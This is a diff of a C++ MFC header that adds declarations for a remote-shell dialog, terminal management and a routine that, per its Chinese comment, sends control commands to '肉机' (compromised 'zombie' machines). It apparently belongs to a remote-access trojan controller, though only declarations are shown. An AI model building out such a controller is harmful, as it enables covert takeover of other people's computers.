@@ -23,16 +23,28 @@ public:
 	void	InitToolBar();
 	void	InitOnlineListCtrl();
 	void	InitEventLogListCtrl();
-	void	AddContextListCtrol(CListCtrl &lc, std::initializer_list<LPCTSTR>context);
+	void	AddContextListCtrol(CListCtrl &lc,
+								std::initializer_list<LPCTSTR>context,
+								ClientContext *pContext);
 	void	InitStatusBar();
 	void	InitNotify();
 	CString GetSystemTime();
+	void    GetLocalIPList(CHAR *szIPList);
 	void	StartNetwork();
 
 	
 	// 自定义消息处理
 	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
 	afx_msg LRESULT OnAddOnline(WPARAM wParam, LPARAM lParam);
+	afx_msg LRESULT OnOpenShellDlg(WPARAM wParam, LPARAM lParam);
+
+	/* 工具栏的功能实现 */
+	// 终端管理
+	afx_msg void OnOnlineCmd();	
+	// 进程管理
+
+	// 工具栏的功能实现统一调用该函数发送控制命令给肉机
+	void SendSelectedToken(PBYTE pToken, UINT nSize);
 
 	afx_msg void OnSize(UINT nType, int cx, int cy);
 	afx_msg void OnMainSetting();
@@ -59,6 +71,7 @@ protected:
 	UINT				m_nWndWidth;
 	CStatusBar			m_sbStatusBar;
 	NOTIFYICONDATA		m_nifNotify;
+	//CIOCPServer			*m_iocpServer;
 
 	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode);
 	static void ProcessReceiveComplete(ClientContext *pContext);
@@ -68,5 +81,5 @@ protected:
 	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
 	afx_msg void OnPaint();
 	afx_msg HCURSOR OnQueryDragIcon();
-	DECLARE_MESSAGE_MAP()	
+	DECLARE_MESSAGE_MAP()
 };
